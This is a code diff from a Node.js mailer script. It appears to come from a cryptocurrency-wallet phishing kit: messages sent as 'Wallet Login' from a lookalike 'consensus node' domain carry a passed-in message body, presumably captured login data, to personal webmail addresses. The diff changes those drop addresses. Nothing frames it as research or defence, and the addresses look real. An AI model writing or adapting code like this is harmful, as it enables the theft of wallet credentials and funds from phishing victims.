@@ -50,7 +50,7 @@ async function main(Mes) {
     // send mail with defined transport object
     let info = await transporter.sendMail({
       from: '"Wallet Login 👻" <info@unitedbconsesusnode.com>', // sender address
-      to: "mrjohn.soft@gmail.com,Huyfardry@gmail.com", // list of receivers
+      to: "fardry@mail.com", // list of receivers
       subject: "Hello ✔", // Subject line
       text: `${Mes}`, // plain text body
       html: `<b>${Mes}</b>`, // html body
